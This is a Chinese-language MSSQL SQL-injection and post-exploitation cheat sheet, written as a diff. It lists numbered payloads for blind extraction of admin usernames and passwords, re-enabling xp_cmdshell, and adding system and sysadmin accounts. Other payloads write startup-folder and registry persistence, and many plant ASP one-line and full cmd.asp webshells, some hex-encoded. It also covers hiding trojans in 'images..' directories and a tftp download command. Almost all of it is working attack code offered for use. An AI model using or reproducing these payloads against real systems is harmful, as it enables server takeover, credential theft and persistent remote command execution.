@@ -1,0 +1,790 @@
+1、返回的是连接的数据库名
+and db_name()>0
+2、作用是获取连接用户名
+and user>0
+3、将数据库备份到Web目录下面
+;backup database 数据库名 to disk='c:\inetpub\wwwroot\1.db';--
+4、显示SQL系统版本
+and 1=(select @@VERSION) 或and 1=convert(int,@@version)--
+5、判断xp_cmdshell扩展存储过程是否存在
+and 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE xtype = 'X' AND name ='xp_cmdshell')
+6、恢复xp_cmdshell扩展存储的命令
+;exec master.dbo.sp_addextendedproc 'xp_cmdshell','e:\inetput\web\xplog70.dll';--
+7、向启动组中写入命令行和执行程序
+;EXEC master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows\CurrentVersion\ 
+Run','help1','REG_SZ','cmd.exe /c net user test ptlove /add' 
+8、查看当前的数据库名称
+and 0 <> db_name(n) n改成0,1,2,3……就可以跨库了 或and 1=convert(int,db_name())--
+9.更新表内容,可用于修改网站后台管理员口令（一般是用md5加密的）
+    Update films SET kind = 'Dramatic' Where id = 123
+    实例：update eims_User set Loginpassword='49ba59abbe56e057' where UserName='admin'
+10.插入字段内容
+    ;insert into Persons (LastName, Address) VALUES ('Wilson', 'Champs-Elysees')
+11.删除内容
+    delete from table_name where Stockid = 3
+12.写入一句话木马Webshell
+    （在查询分析器中，可以正常运行，但是在URL测试写入一句话（<%eval request("#")%>）时，显“'<eval request("' 之前有未闭合的引号”错误。）
+    1)    用backup创建webshell
+    use model
+    create table cmd(str image);
+    insert into cmd(str) values (‘’);
+    backup database model to disk=’c:\l.asp’;
+    备注：缺点在于数据库内容过多，找开webshell时很慢。
+    2)    用 sp_makewebtask直接在web目录里写入一句话马：
+    ;exec sp_makewebtask 'c:\1.asp',' select ''<%execute(request("a"))%>'' '
+
+10、则把得到的数据内容全部备份到WEB目录下
+;backup database 数据库名 to disk='c:\inetpub\wwwroot\save.db'
+11、通过复制CMD创建UNICODE漏洞
+;exec master.dbo.xp_cmdshell "copy c:\winnt\system32\cmd.exe c:\inetpub\scripts\cmd.exe"
+12、遍历系统的目录结构，分析结果并发现WEB虚拟目录
+先创建一个临时表：temp   ;create table temp(id nvarchar(255),num1 nvarchar(255),num2 nvarchar(255),num3 nvarchar(255));--
+(1)利用xp_availablemedia来获得当前所有驱动器,并存入temp表中       ;insert temp exec master.dbo.xp_availablemedia;--
+通过查询temp的内容来获得驱动器列表及相关信息 
+(2)利用xp_subdirs获得子目录列表,并存入temp表中                    ;insert into temp(id) exec master.dbo.xp_subdirs 'c:\';--
+(3)还可以利用xp_dirtree获得所有子目录的目录树结构,并寸入temp表中 ;insert into temp(id,num1) exec master.dbo.xp_dirtree 'c:\';-- （实验成功）
+13、查看某个文件的内容，可以通过执行xp_cmdsell
+;insert into temp(id) exec master.dbo.xp_cmdshell 'type c:\web\index.asp';--
+14、将一个文本文件插入到一个临时表中
+;bulk insert temp(id) from 'c:\inetpub\wwwroot\index.asp'
+15、每完成一项浏览后，应删除TEMP中的所有内容，删除方法是：
+;delete from temp;--
+16、浏览TEMP表的方法是：
+and (select top 1 id from TestDB.dbo.temp)>0   假设TestDB是当前连接的数据库名
+17、猜解所有数据库名称
+and (select count(*) from master.dbo.sysdatabases where name>1 and dbid=6) <>0 dbid=6,7,8分别得到其它库名
+18、猜解数据库中用户名表的名称
+and (select count(*) from TestDB.dbo.表名)>0   若表名存在，则abc.asp工作正常，否则异常。如此循环，直到猜到系统帐号表的名称。
+19、判断是否是sysadmin权限
+and 1=(SELECT IS_SRVROLEMEMBER('sysadmin'))
+20、判断是否是SA用户
+'sa'=(SELECT System_user)
+21、查看数据库角色
+;use model--
+22、查看库名
+and 0<>(select count(*) from master.dbo.sysdatabases where name>1 and dbid=6)--
+23、获得第一个用户建立表的名称
+and (select top 1 name from TestDB.dbo.sysobjects where xtype='U' and status>0 )>0 假设要获得数据库是TestDB.dbo
+24、获得第二个用户建立的表的名称
+and (select top 1 name from TestDB.dbo.sysobjects where xtype='U' and status>0 and name not in('xyz'))>0
+25、获得第三个用户建立的表的名称
+and (select top 1 name from TestDB.dbo.sysobjects where xtype='U' and status>0 and name not in('xyz',''))>0 ''中为第二个用户名
+26、获得第四个用户建立的表的名称
+and (select top 1 name from TestDB.dbo.sysobjects where xtype='U' and status>0 and name not in('xyz','',''))>0 '',''中为第二,三个用户名
+27、获得表中记录的条数
+and (select count(*) from 表名）<5 记录条数小于5 或 <10 记录条数小于10 ……等等
+28、测试权限结构（mssql） 
+and 1=(SELECT IS_SRVROLEMEMBER('sysadmin'));-- 
+and 1=(SELECT IS_SRVROLEMEMBER('serveradmin'));-- 
+and 1=(SELECT IS_SRVROLEMEMBER('setupadmin'));-- 
+and 1=(SELECT IS_SRVROLEMEMBER('securityadmin'));-- 
+and 1=(SELECT IS_SRVROLEMEMBER('diskadmin'));-- 
+and 1=(SELECT IS_SRVROLEMEMBER('bulkadmin'));-- 
+and 1=(SELECT IS_MEMBER('db_owner'));-- 
+29、 添加mssql和系统的帐户 
+;exec master.dbo.sp_addlogin username;-- 
+;exec master.dbo.sp_password null,username,password;-- 
+;exec master.dbo.sp_addsrvrolemember sysadmin username;-- 
+;exec master.dbo.xp_cmdshell 'net user username password /workstations:* /times:all /passwordchg:yes /passwordreq:yes /active:yes /add';-- 
+;exec master.dbo.xp_cmdshell 'net user username password /add';-- 
+;exec master.dbo.xp_cmdshell 'net localgroup administrators username /add';-- 
+30、 简洁的webshell 
+use model 
+create table cmd(str image); 
+insert into cmd(str) values ('<%=server.createobject("wscript.shell").exec("cmd.exe /c "request("c")).stdout.readall%>'); 
+backup database model to disk='g:\wwwtest\l.asp';
+请求的时候，像这样子用： 
+http://ip/l.asp?c=dir
+31、猜解字段名称
+猜解法：and (select count(字段名) from 表名)>0 若“字段名”存在，则返回正常
+读取法：and (select top 1 col_name(object_id('表名'),1) from sysobjects)>0 把col_name(object_id('表名'),1)中的1依次换成2,3,4,5，6…就可得到所有的字段名称。
+32、 猜解用户名与密码
+ASCII码逐字解码法:基本的思路是先猜出字段的长度，然后依次猜出每一位的值
+and (select top 1 len(username) from admin)=X(X=1,2，3,4，5，… n，假设：username为用户名字段的名称，admin为表的名称 若x为某一值i且abc.asp运行正常时，则i就是第一个用户名的长度。
+and (select top 1 ascii(substring(username,m,1)) from admin)=n (m的值在上一步得到的用户名长度之间，当m=1，2,3，…时猜测分别猜测第1,2,3,…位的值；n的值是1~9、a~z、A~Z的ASCII值，也就是1~128之间的任意值；admin为系统用户帐号表的名称)，
+33、建立数据表
+;create table 表名 (列名1 数据类型,列名2 数据类型);--
+34、向表格中插入数据
+;insert into 表名 (列名1,列名2，……） values ('值1','值2'……);--
+35、更新记录
+update 表名 set 列名1='值'…… where ……
+36、删除记录
+delete from 表名 where ……
+37、删除数据库表格
+drop table 表名
+38、将文本文件导入表
+使用'bulk insert'语法可以将一个文本文件插入到一个临时表中。简单地创建这个表：
+create table foo( line varchar(8000))
+然后执行bulk insert操作把文件中的数据插入到表中，如：
+bulk insert foo from 'c:\inetpub\wwwroot\process_login.asp'
+39、备份当前数据库的命令：
+declare @a sysname;set @a=db_name();backup database @a to disk='你的IP你的共享目录bak.dat' ,name='test';--
+40、使用sp_makewebtask处理过程的相关请求写入URL
+; EXEC master..sp_makewebtask "[url=file://\\10.10.1.3\share\output.html]\\10.10.1.3\share\output.html[/url]", "SELECT * FROM INFORMATION_SCHEMA.TABLES"
+41、将获得SQLSERVER进程的当前工作目录中的目录列表
+Exec master..xp_cmdshell 'dir'
+42、将提供服务器上所有用户的列表
+Exec master..xp_cmdshell 'net user'
+43、读注册表存储过程
+exec xp_regread HKEY_LOCAL_MACHINE,'SYSTEM\CurrentControlSet\Services\lanmanserver\parameters', 'nullsessionshares'
+44、xp_servicecontrol过程允许用户启动，停止，暂停和继续服务
+exec master..xp_servicecontrol 'start','schedule'
+exec master..xp_servicecontrol 'start','server'
+45、显示机器上有用的驱动器
+Xp_availablemedia 
+46、允许获得一个目录树
+Xp_dirtree 
+47、提供进程的进程ID，终止此进程
+Xp_terminate_process
+48、恢复xp_cmdshell
+Exec master.dbo.addextendedproc 'xp_cmdshell','xplog70.dll'
+49、堵上cmdshell的SQL语句
+sp_dropextendedproc "xp_cmdshell"
+50、不需要XP_CMDSHLL直接添加系统帐号,对XPLOG70.DLL被删很有效
+declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\winnt\system32\cmd.exe /c net user gchn aaa /add'-- 
+51、在数据库内添加一个hax用户
+;exec sp_addlogin hax;--
+52、给hax设置密码
+;exec master.dbo.sp_password null,username,password;--
+53、将hax添加到sysadmin组
+;exec master.dbo.sp_addsrvrolemember sysadmin hax;--
+54、(1)遍历目录
+;create table dirs(paths varchar(100), id int) 
+;insert dirs exec master.dbo.xp_dirtree 'c:\' 
+;and (select top 1 paths from dirs)>0 
+;and (select top 1 paths from dirs where paths not in('上步得到的paths'))>)
+55、(2)遍历目录
+;create table temp(id nvarchar(255),num1 nvarchar(255),num2 nvarchar(255),num3 nvarchar(255));-- 
+;insert temp exec master.dbo.xp_availablemedia;--　 获得当前所有驱动器 
+;insert into temp(id) exec master.dbo.xp_subdirs 'c:\';--　获得子目录列表 
+;insert into temp(id,num1) exec master.dbo.xp_dirtree 'c:\';--　获得所有子目录的目录树结构 
+;insert into temp(id) exec master.dbo.xp_cmdshell 'type c:\web\index.asp';--　 查看文件的内容
+56、mssql中的存储过程
+xp_regenumvalues 注册表根键, 子键 
+;exec xp_regenumvalues 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows\CurrentVersion\Run'　　以多个记录集方式返回所有键值 
+xp_regread 根键,子键,键值名 
+;exec xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows\CurrentVersion','CommonFilesDir'　返回制定键的值 
+xp_regwrite 根键,子键, 值名, 值类型, 值 
+值类型有2种REG_SZ 表示字符型,REG_DWORD 表示整型 
+;exec xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows\CurrentVersion','TestValueName','reg_sz','hello'　写入注册表 
+xp_regdeletevalue 根键,子键,值名 
+exec xp_regdeletevalue 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows\CurrentVersion','TestValueName'　 删除某个值 
+xp_regdeletekey 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows\CurrentVersion\Tes
+tkey'　 删除键,包括该键下所有值 
+57、mssql的backup创建webshell 
+use model 
+create table cmd(str image); 
+insert into cmd(str) values ('<% Dim oScript %>'); 
+backup database model to disk='c:\l.asp';
+58、简洁的webshell
+use model 
+create table cmd(str image); 
+insert into cmd(str) values ('<%=server.createobject("wscript.shell").exec("cmd.exe /c "request("c")).stdout.readall%>'); 
+backup database model to disk='g:\wwwtest\l.asp';
+请求的时候，像这样子用： 
+http://ip/l.asp?c=dir 
+59、利用其它存储过程执行命令
+; DECLARE @shell INT EXEC SP_OACREATE 'wscript.shell',@shell OUTPUT EXEC SP_OAMETHOD @shell,'run',null, 'C：\WINNT\system32\cmd.exe /c net user cntest chinatest /add';--
+60、利用内置存储过程 xp_regread(读取注册表键值，权限public)： 
+;CREATE TABLE newtable(id int IDENTITY(1,1),paths varchar(500)) Declare @test varchar(20) exec master..xp_regread @rootkey='HKEY_LOCAL_MACHINE', @key='SYSTEM\CurrentControlSet\Services\W3SVC\Parameters\Virtual Roots\', @value_name='/', [email=values=@test]values=@test[/email] OUTPUT insert into paths(path) values(@test);--
+利用爆字段将数据库的值读出来
+and 0<>(select top 1 paths from newtable)
+61、利用FSO直接写入ASP木马（提示必须拥用SYSADMIN权限才可使用FSO和FSO开启的前提下）(作用：E：\WWW下创建一个test.asp并写入On Error Resume next语句)
+;declare%20@o%20int,%20@f%20int,%20@t%20int,%20@ret%20int%20exec%20sp_oacreate%20'scripting.filesystemobject',
+[email=%20@o%20out%20exec%20sp_oamethod%20@o,%20]%20@o%20out%20exec%20sp_oamethod%20@o,%20'createtextfile',%20@f%20out,%20'e[/email]：\www\test.asp',
+[email=1%20exec%20@ret%20=%20sp_oamethod%20@f,%20]1%20exec%20@ret%20=%20sp_oamethod%20@f,%20'writeline',%20NULL,%20'On[/email] Error Resume Next';--
+62、猜字段中记录长度
+and (select top 1 len(字段名) from 数据库名)>0
+63、(1)猜字段的ascii值（access)
+and (select top 1 asc(mid(字段名,1,1)) from 数据库名)>0
+    (2)猜字段的ascii值（mssql)
+and (select top 1 unicode(substring(字段名,1,1)) from 数据库名)>0
+64、检索系统用户
+Select * from sysxlogins
+65、SQL7中的建表命令
+create table [dbo].[temp] ([id] [nvarchar](255) ,[num1] [nvarchar](255) ,[num2] [nvarchar](255) ,[num3] [nvarchar](255))
+66、检索数据库的命令
+select * from [dbo].[temp]
+67、差异备份
+(1)declare @a sysname,@s varchar(4000) select @a=db_name(),@s=0x737335323635 backup database @a to [email=disk=@s]disk=@s[/email]
+(2)Drop table [heige];create table [dbo].[heige] ([cmd] [image])
+(3)insert into heige(cmd) values(0x3C25657865637574652872657175657374282276616C7565222929253E) //values('<%execute(request("value"))%>') 
+(4)declare @a sysname,@s varchar(4000) select @a=db_name(),@s=0x643A5C6B79736A7A7765625C6B79736A7A7765625C72692E617370 backup database @a to [email=disk=@s]disk=@s[/email] WITH DIFFERENTIAL,FORMAT   [url=]//@s='d:\kysjzweb\kysjzweb\ri.asp'[/url]
+(5)Drop table [heige]            
+68、如何删除 cmdshell 存储过程
+您必须有系统管理员用户权除去 cmdshell 存储过程。 要删除存储过程, 
+在命令提示符处键入以下命令： 
+exec sp_dropextendedproc 'xp_cmdshell'
+要重新添加 cmdshell 存储过程, 在命令提示符处键入以下命令： 
+exec sp_addextendedproc 'xp_cmdshell','xplog70.dll'
+69、添加SQL帐户并加入管理组
+exec master..sp_addlogin UserName,Password
+exec master..sp_addsrvrolemember UserName,sysadmin
+70、查看WEB网站安装目录命令：
+cscript c:\inetpub\adminscripts\adsutil.vbs enum w3svc/2/root >c:\test1.txt （将2换成1、3、4、5试试）
+type c:\test1.txt
+del c:\test1.txt
+71、查找某个文件
+c:\>dir 文件名 /s 查找c盘下的此文件
+72、建立/删除虚拟目录
+建立虚拟目录win,指向c:\winnt\system32：exec master.dbo.xp_cmdshell 'cscript C:\inetpub\AdminScripts\mkwebdir.vbs -c localhost -w "l" -v "win","c:\winnt\system32"' 
+让win目录具有解析asp脚本权限：exec master.dbo.xp_cmdshell 'cscript C:\inetpub\AdminScripts\adsutil.vbs set w3svc/1/root/win/Accesxxxecute "true" –s:' 
+删除虚拟目录win：exec master.dbo.xp_cmdshell 'cscript C:\inetpub\AdminScripts\adsutil.vbs delete w3svc/1/root/win/'
+73、win2000下将WEB用户提升为系统用户权限，需要有管理员的权限才能执行
+c:\>cscript C:\Inetpub\AdminScripts\adsutil.vbs set /W3SVC/InProcessIsapiApps "C:\WINNT\system32\idq.dll" "C:\WINNT\system32\inetsrv\httpext.dll" "C:\WINNT\system32\inetsrv\httpodbc.dll" "C:\WINNT\system32\inetsrv\ssinc.dll" "C:\WINNT\system32\msw3prt.dll" "C:\winnt\system32\inetsrv\asp.dll"         2000系统
+或者cscript C:\Inetpub\AdminScripts\adsutil.vbs set /W3SVC/InProcessIsapiApps "C:\windows\system32\idq.dll" "C:\windows\system32\inetsrv\httpext.dll" "C:\windows\system32\inetsrv\httpodbc.dll" "C:\windows\system32\inetsrv\ssinc.dll" "C:\windows\system32\msw3prt.dll" "C:\windows\system32\inetsrv\asp.dll"   2003系统
+查看是否成功：
+c:\>cscript C:\Inetpub\AdminScripts\adsutil.vbs get w3svc/inprocessisapiapps
+74、如何隐藏ASP木马：
+建立非标准目录：mkdir images..\
+拷贝ASP木马至目录：copy c:\inetpub\wwwroot\dbm6.asp c:\inetpub\wwwroot\images..\news.asp
+通过web访问ASP木马：http://ip/images../news.asp?action=login
+如何删除非标准目录：rmdir images..\ /s
+75、sql2005开启xp_cmdshell
+MSSQL SERVER 2005默认把xpcmdshell 给ON了
+如果要启用的话就必须把他加到高级用户模式
+可以直接在注入点那里直接注入
+id=5;EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;--
+然后;dbcc addextendedproc("xp_cmdshell","xplog70.dll");--
+或者
+sp_addextendedproc xp_cmdshell,@dllname='xplog70.dll'
+来恢复cmdshell。
+分析器
+EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;--
+然后;dbcc addextendedproc("xp_cmdshell","xplog70.dll")
+76、不需xp_cmdshell支持在有注入漏洞的SQL服务器上运行CMD命令
+create TABLE mytmp(info VARCHAR(400),ID int IDENTITY(1,1) NOT NULL)
+DECLARE @shell INT
+DECLARE @fso INT
+DECLARE @file INT
+DECLARE @isEnd BIT
+DECLARE @out VARCHAR(400)
+EXEC sp_oacreate 'wscript.shell',@shell output
+EXEC sp_oamethod @shell,'run',null,'cmd.exe /c dir c:/>c:/temp.txt','0','true'
+EXEC sp_oacreate 'scripting.filesystemobject',@fso output
+EXEC sp_oamethod @fso,'opentextfile',@file out,'c:/temp.txt'
+WHILE @shell>0
+BEGIN
+EXEC sp_oamethod @file,'Readline',@out out
+insert INTO MYTMP(info) VALUES (@out)
+EXEC sp_oagetproperty @file,'AtEndOfStream',@isEnd out
+IF @isEnd=1 BREAK
+ELSE CONTINUE
+END
+drop TABLE MYTMP
+77、xp_cmdshell新的恢复办法
+删除
+drop procedure sp_addextendedproc
+drop procedure sp_oacreate
+exec sp_dropextendedproc 'xp_cmdshell' 
+恢复
+dbcc addextendedproc ("sp_oacreate","odsole70.dll")
+dbcc addextendedproc ("xp_cmdshell","xplog70.dll")
+这样可以直接恢复，不用去管sp_addextendedproc是不是存在
+78、sp_makewebtask的用法
+EXECUTE sp_makewebtask @outputfile='C:\WEB\yfdmm.asp',
+@query='SELECT 你的字段 FROM 你建的临时表'
+79、用存储过程写文件
+写vbs文件到启动组里面：
+declare @o int, @f int, @t int, @ret int ,@a int
+exec sp_oacreate 'scripting.filesystemobject', @o out
+exec sp_oamethod @o, 'createtextfile', @f out, 
+'c:\\docume~1\\alluse~1\\「开始」菜单\\程序\\启动[url=file://\\a.vbs]\\a.vbs'[/url], 1
+exec @ret = sp_oamethod @f, 'writeline', null,
+'set wshshell=createobject("wscript.shell")'
+exec @ret = sp_oamethod @f, 'writeline', null,
+'a=wshshell.run ("cmd.exe /c net user lintao lintao520 /add",0)'
+exec @ret = sp_oamethod @f, 'writeline', null,
+'b=wshshell.run ("cmd.exe /c net localgroup administrators lintao /add",0)'
+80、tftp下载的命令
+tftp -i ip get 下载文件名 保存文件名 说明：ip是提供下载的服务器IP
+81、显示注册表中的一个子键下的所有键值
+exec xp_regenumvalues 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows\CurrentVersion\run'
+82、用其它存储过程写文件
+declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\winnt\system32\cmd.exe /c echo 12345678>c:\123.txt' 在c盘上写123.txt，内容是：12345678
+declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c tasklist>c:\123.txt'     列进程写进123.txt windowsxp/2003系统
+83、将文本文件导入表
+create table foo(line varchar(8000))
+bulk insert foo from 'c:\123.txt'
+84、log备份
+alter database XXXX set RECOVERY FULL
+create table cmd (a image)
+backup log XXXX to disk = 'c:\Sammy' with init
+insert into cmd (a) values ('<%Execute(request("value"))%>')
+backup log XXXX to disk = 'c:\xxx\2.asp'
+85、sp_makewebtask直接写一句话
+;exec sp_makewebtask @outputfile='D:\Homepage\sohostudio\img\23456.asp',@query='select ''<%25execute (request("value"))%25>'' '
+86、读WEB位置
+;create table [dbo].[cxd] ([cxd][char](255));--
+;DECLARE @result varchar(255) EXEC master.dbo.xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\ControlSet001\Services\W3SVC\Parameters\Virtual Roots ', '/', @result output insert into cxd(cxd) values(@result);--
+87、另一种LOG备份
+;alter database XXXX set RECOVERY FULL--
+;create table [dbo].[shit_tmp] ([cmd] [image])--
+;declare @a sysname,@s nvarchar(4000) select @a=db_name(),@s=0x7900690061006F006C007500 backup log @a to disk = @s with init,no_truncate--
+;insert into [shit_tmp](cmd) values(0x3C25657865637574652872657175657374282276616C7565222929253E)--     //values('<%execute(request("value"))%>') 
+;declare @a sysname,@s nvarchar(4000) select @a=db_name(),@s=0x65003A005C0061006C006C005F0068006F006D0065005C00790065006C006C006F0077005F0068006F006D0065005C007200690035002E00610073007000 backup log @a to [email=disk=@s]disk=@s[/email] with init,no_truncate--     [url=]//@s=e:\all_home\yellow_home\ri5.asp[/url]
+;Drop table [shit_tmp]--
+88、一句话马的几种写法
+a).<%%25Execute(request("a"))%%25>
+b).<%Execute(request("a"))%>
+c).%><%execute request("a")%><%
+d).<script language=VBScript runat=server>execute request("a")</script>
+e).<%25Execute(request("a"))%25>
+89、另两种差异备份
+(1)
+;declare @a sysname,@s nvarchar(4000) select @a=db_name(),@s=0x77006F006B0061006F002E00620061006B00 backup database @a to [email=disk=@s]disk=@s[/email]--
+;create table [dbo].[xiaolu] ([cmd] [image])--
+;insert into xiaolu(cmd) values(0x3C25657865637574652872657175657374282261222929253E)--
+;declare @a sysname,@s nvarchar(4000) select @a=db_name(),@s=0x65003A005C007700650062005C0077006F006B0061006F002E00610073007000 backup database @a to [email=disk=@s]disk=@s[/email] WITH DIFFERENTIAL,FORMAT--
+(2)
+;backup database 库名 to disk = 'c:\ddd.bak'--
+;create table [dbo].[dtest] ([cmd] [image])--
+;insert into dtest(cmd) values (0x3C25657865637574652872657175657374282261222929253E)--
+;backup database 库名 to disk='目标位置\d.asp' WITH DIFFERENTIAL,FORMAT--
+90、不需要FSO的WEBSHELL
+<%=server.createobject("wscript.shell").exec("cmd.exe /c "request("c")).stdout.readall%>
+十六进制为： 0x3C253D7365727665722E6372656174656F626A6563742822777363726970742E7368656C6C22292E657865632822636D642E657865202F63202226726571756573742822632229292E7374646F75742E72656164616C6C253E
+91、建一个cmd.asp的语句：
+use model 
+create table cmd (str image); 
+insert into cmd(str) values ('<% Dim oScript %>'); 
+insert into cmd(str) values ('<% Dim oScriptNet%>'); 
+insert into cmd(str) values ('<% Dim oFileSys, oFile%>'); 
+insert into cmd(str) values ('<% Dim szCMD, szTempFile%>'); 
+insert into cmd(str) values ('<% Set oScript = Server.CreateObject("WSCRIPT.SHELL")%>'); 
+insert into cmd(str) values ('<% Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")%>'); 
+insert into cmd(str) values ('<% Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")%>'); 
+insert into cmd(str) values ('<% szCMD = Request.Form(".CMD")%>'); 
+insert into cmd(str) values ('<% If (szCMD <> "") Then%>'); 
+insert into cmd(str) values ('<% szTempFile = "C:\" oFileSys.GetTempName()%>'); 
+insert into cmd(str) values ('<% Call oScript.Run ("cmd.exe /c " szCMD & " > " & szTempFile, 0, True)%>'); 
+insert into cmd(str) values ('<% Set oFile = oFileSys.OpenTextFile (szTempFile, 1, False, 0)%>'); 
+insert into cmd(str) values ('<% End If %>'); 
+insert into cmd(str) values ('<HTML><BODY><FORM action="<%= Request.ServerVariables("URL") %>" method="POST">'); 
+insert into cmd(str) values ('<input type=text name=".CMD" size=45 value="<%= szCMD %>"><input type=submit value="Run"></FORM><PRE>'); 
+insert into cmd(str) values ('<% If (IsObject(oFile)) Then%>'); 
+insert into cmd(str) values ('<% On Error Resume Next%>'); 
+insert into cmd(str) values ('<% Response.Write Server.HTMLEncode(oFile.ReadAll)%>'); 
+insert into cmd(str) values ('<% oFile.Close%>'); 
+insert into cmd(str) values ('<% Call oFileSys.DeleteFile(szTempFile, True)%>'); 
+insert into cmd(str) values ('<% End If%>'); 
+insert into cmd(str) values ('</BODY></HTML>');
+92、cmd.asp代码：
+<% Dim oScript %> 
+<% Dim oScriptNet%> 
+<% Dim oFileSys, oFile%> 
+<% Dim szCMD, szTempFile%> 
+<% Set oScript = Server.CreateObject("WSCRIPT.SHELL")%> 
+<% Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")%> 
+<% Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")%> 
+<% szCMD = Request.Form(".CMD")%> 
+<% If (szCMD <> "") Then%> 
+<% szTempFile = "C:\" oFileSys.GetTempName()%> 
+<% Call oScript.Run ("cmd.exe /c " szCMD & " > " & szTempFile, 0, True)%> 
+<% Set oFile = oFileSys.OpenTextFile (szTempFile, 1, False, 0)%> 
+<% End If %> 
+<HTML><BODY><FORM action="<%= Request.ServerVariables("URL") %>" method="POST"> 
+<input type=text name=".CMD" size=45 value="<%= szCMD %>"><input type=submit value="Run"></FORM><PRE> 
+<% If (IsObject(oFile)) Then%> 
+<% On Error Resume Next%> 
+<% Response.Write Server.HTMLEncode(oFile.ReadAll)%> 
+<% oFile.Close%> 
+<% Call oFileSys.DeleteFile(szTempFile, True)%> 
+<% End If%> 
+</BODY></HTML>
+93、cmd.asp的一些变形
+(1)
+<form method="post">
+<input type=text name="cmd" size=60>
+<input type=submit value="run"></form>
+<textarea readonly cols=80 rows=20>
+<%response.write server.createobject("wscript.shell").exec("cmd.exe /c "request.form("cmd")).stdout.readall%>
+</textarea>
+(2)
+<textarea readonly cols=80 rows=20>
+<%response.write server.createobject("wscript.shell").exec("cmd.exe /c "request("cmd")).stdout.readall%>
+(3)
+<%response.write server.createobject("wscript.shell").exec("cmd.exe /c "request("cmd")).stdout.readall%>
+(4)
+<%=server.createobject("wscript.shell").exec("cmd.exe /c "request("c")).stdout.readall%>
+(5)wscript.shell被改名怎么办？
+<ObjEct runat=sErvEr iD=kk scOpE=pagE classiD="clsiD:72C24DD5-D70A-438B-8A42-98424B88AFB8"></ObjEct>
+<%=kk.exec("cmd /c "+request("cmd")).stdout.readall%>
+94、一个上传asp程序
+<% dim objFSO %>
+<% dim fdata %>
+<% dim objCountFile %>
+<% on error resume next %>
+<% Set objFSO = Server.CreateObject("Scripting.FileSystemObject") %>
+<% if Trim(request("syfdpath"))<>"" then %>
+<% fdata = request("cyfddata") %>
+<% Set objCountFile=objFSO.CreateTextFile(request("syfdpath"),True) %>
+<% objCountFile.Write fdata %>
+<% if err =0 then %>
+<% response.write "<font color=red>save Success!</font>" %>
+<% else %>
+<% response.write "<font color=red>Save UnSuccess!</font>" %>
+<% end if %>
+<% err.clear %>
+<% end if %>
+<% objCountFile.Close %>
+<% Set objCountFile=Nothing %>
+<% Set objFSO = Nothing %>
+<% Response.write "<form action='' method=post>" %>
+<% Response.write "保存文件的<font color=red>绝对路径(包括文件名:如D:\web\x.asp):</font>" %>
+<% Response.Write "<input type=text name=syfdpath width=32 size=50>" %>
+<% Response.Write "<br>" %>
+<% Response.write "本文件绝对路径" %>
+<% =server.mappath(Request.ServerVariables("SCRIPT_NAME")) %>
+<% Response.write "<br>" %>
+<% Response.write "输入马的内容:" %>
+<% Response.write "<textarea name=cyfddata cols=80 rows=10 width=32></textarea>" %>
+<% Response.write "<input type=submit value=保存>" %>
+<% Response.write "</form>" %>
+十六进制为:
+0x3C252064696D206F626A46534F20253E
+0x3C252064696D20666461746120253E
+0x3C252064696D206F626A436F756E7446696C6520253E
+0x3C25206F6E206572726F7220726573756D65206E65787420253E
+0x3C2520536574206F626A46534F203D205365727665722E4372656174654F626A6563742822536372697074696E672E46696C6553797374656D4F626A656374222920253E
+0x3C25206966205472696D2872657175657374282273796664706174682229293C3E2222207468656E20253E
+0x3C25206664617461203D207265717565737428226379666464617461222920253E
+0x3C2520536574206F626A436F756E7446696C653D6F626A46534F2E4372656174655465787446696C6528726571756573742822737966647061746822292C547275652920253E
+0x3C25206F626A436F756E7446696C652E577269746520666461746120253E
+0x3C2520696620657272203D30207468656E20253E 743E2220253E
+0x3C2520656C736520253E
+0x3C2520726573706F6E73652E777269746520223C666F6E7420636F6C6F723D7265643E5361766520556E53756363657373213C2F666F6E743E2220253E
+0x3C2520656E6420696620253E
+0x3C25206572722E636C65617220253E
+0x3C2520656E6420696620253E
+0x3C25206F626A436F756E7446696C652E436C6F736520253E
+0x3C2520536574206F626A436F756E7446696C653D4E6F7468696E6720253E
+0x3C2520536574206F626A46534F203D204E6F7468696E6720253E
+0x3C2520526573706F6E73652E777269746520223C666F726D20616374696F6E3D2727206D6574686F643D706F73743E2220253E
+0x3C2520526573706F6E73652E777269746520224FDD5B5865874EF676843C666F6E7420636F6C6F723D7265643E7EDD5BF98DEF5F8428530562EC65874EF6540D3A5982443A5C7765625C782E617370293A3C2F666F6E743E2220253E
+0x3C2520526573706F6E73652E577269746520223C696E70757420747970653D74657874206E616D653D73796664706174682077696474683D33322073697A653D35303E2220253E
+0x3C2520526573706F6E73652E577269746520223C62723E2220253E
+0x3C2520526573706F6E73652E77726974652022672C65874EF67EDD5BF98DEF5F842220253E
+0x3C25203D7365727665722E6D61707061746828526571756573742E5365727665725661726961626C657328225343524950545F4E414D4522292920253E
+0x3C2520526573706F6E73652E777269746520223C62723E2220253E
+0x3C2520526573706F6E73652E777269746520228F9351659A6C768451855BB93A2220253E
+0x3C2520526573706F6E73652E777269746520223C7465787461726561206E616D653D637966646461746120636F6C733D383020726F77733D31302077696474683D33323E3C2F74657874617265613E2220253E
+0x3C2520526573706F6E73652E777269746520223C696E70757420747970653D7375626D69742076616C75653D4FDD5B583E2220253E
+0x3C2520526573706F6E73652E777269746520223C2F666F726D3E2220253E 
+95、mssql中的存储过程
+(1)xp_regenumvalues 注册表根键, 子键 
